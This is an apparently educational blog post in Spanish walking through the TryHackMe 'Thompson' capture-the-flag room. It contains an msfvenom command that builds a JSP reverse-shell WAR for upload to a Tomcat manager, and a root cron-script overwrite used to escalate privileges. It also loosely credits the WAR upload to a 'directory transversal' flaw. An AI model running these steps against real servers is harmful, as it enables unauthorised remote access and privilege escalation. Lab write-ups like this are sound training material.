---
layout: post
title: Thompson
date: 2025-01-03 21:00:00
description: CTF sencillo con escalamiento a nivel root
tags: ctf pentesting msfvenom web_application_archive .war apache tomcat directory_transversal
categories: Seguridad Informática
thumbnail: assets/img/thompson.png
featured: false
---

# **Datos Generales**
- **URL**: https://tryhackme.com/r/room/bsidesgtthompson
- **Dificultad**: Fácil
- **Flags**: Usuario y Root
- **Aprendizaje**: Explotación con metasploit, crontab  


# **Conocimientos iniciales**
### Apache Tomcat y archivos .war
Las versiones anteriores a 6.024/5.5.29 de tomcat son vulnerables a directory transversal, lo que permite ejecutar un payload desde metasploit, entre otras técnicas de explotación. 

Información ampliada en el siguiente enlace: <a href=" https://www.tenable.com/plugins/nessus/44314" target="_blank">Apache Tomcat WAR Multiple Vulnerabilities</a>

### crontab
Crontab ejecuta tareas automatizadas en segundo plano, desde una lista alojada en **etc/crontab** o en otra ubicación determinada por el administrador.

Información ampliada en el siguiente enlace: <a href="https://www.hackingarticles.in/crontab-command/" target="_blank">Crontab</a>

# **El CTF** 
### Reconocimiento
Al iniciar el proceso de **reconocimiento** es común realizar la enumeración de puertos, el scaneo de directorios y de subdominios, entre otras pruebas según presente la aplicación web obejtivo.
En el caso de este ctf se obtuvo resultados de ínteres mediante el scaneo de puertos. La herramienta utilizada para ello fue  nmap. El resultado muestra que el puerto 8080 se encuentra habilitado para desplegar el servicio **Apache Tomcat**  

Ingresando por el puerto 8080 se observa que se despliega un menu de inicio de sesión, el cual al oprimir en **cancel** despliega una pagina de **error** con información importante.

<div class="row mt-3">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/ctf-thompson-01.png" class="img-fluid rounded z-depth-1" zoomable=true %}
    </div>
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/ctf-thompson-02.png" class="img-fluid rounded z-depth-1" zoomable=true %}
    </div>
</div>
<div class="caption">
    Inicio de sesión
</div>

## Primera Flag

Realizando el login con las credenciales obtenidas en la página de error accedemos al siguiente panel

<div class="row mt-3">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/ctf-thompson-03.png" class="img-fluid rounded z-depth-1" zoomable=true %}
    </div>
</div>

La página permite "subir" e implementar archivos .war en el servidor

<div class="row mt-3">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/ctf-thompson-04.png" class="img-fluid rounded z-depth-1" zoomable=true %}
    </div>
</div>

Como se expuso al inicio de este tutorial, es posible realizar un ataque de tipo directory transversal mediante el uso de archivos war. Para ello necesitaremos **msfvenom** para generar el payload. Como podemos ver a continuación

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```

Se puede obtener el payload desde: ```https://book.hacktricks.wiki/es/generic-hacking/reverse-shells/msfvenom.html?highlight=war#war```

Generamos el payload y ponemos un servidor en escucha en el puerto 4444

<div class="row mt-3">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/ctf-thompson-07.png" class="img-fluid rounded z-depth-1" zoomable=true %}
    </div>
</div>

Una vez subido el archivo reverse_shell.war ejecutamos el payload desde el panel de administración

<div class="row mt-3">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/ctf-thompson-08.png" class="img-fluid rounded z-depth-1" zoomable=true %}
    </div>
</div>

Observamos que fue posible la conexión a través del payload. A continuación realizamos la búsqueda de la flag en los archivos del servidor.

<div class="row mt-3 justify-content-center">
    <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0">
        <div class="img-container">
            {% include figure.liquid path="assets/img/ctf-thompson-09.png" class="img-fluid rounded z-depth-1" zoomable=true %}
        </div>
    </div>
</div>

## Escalamiento de privilegios
### Flag de root

Notamos que el archivo **id.sh** se encuentra enlazado al archivo **test.txt**, es posible que se ejecute mediante crontab

<div class="row mt-3">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/ctf-thompson-10.png" class="img-fluid rounded z-depth-1" zoomable=true %}
    </div>
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/ctf-thompson-11.png" class="img-fluid rounded z-depth-1" zoomable=true %}
    </div>
</div>

Utilizamos el comando **echo** para copiar 
```
echo 'cp /root/root.txt /home/jack/root.txt' > id.sh
```

Al ejecutarse este comando, se copiará el archivo root.txt ubicado en el directorio /root/ al directorio /home/jack/.

<div class="row mt-3">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/ctf-thompson-13.png" class="img-fluid rounded z-depth-1" zoomable=true %}
    </div>
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/ctf-thompson-14.png" class="img-fluid rounded z-depth-1" zoomable=true %}
    </div>
</div>

Esperamos un momento a que se ejecute la tarea en crontab, y accedemos root.txt obteniendo la segunda flag

<div class="row mt-3 justify-content-center">
    <div class="col-10 col-sm-8 col-md-6 mt-3 mt-md-0">
        <div class="img-container">
            {% include figure.liquid path="assets/img/ctf-thompson-12.png" class="img-fluid rounded z-depth-1" zoomable=true %}
        </div>
    </div>
</div>
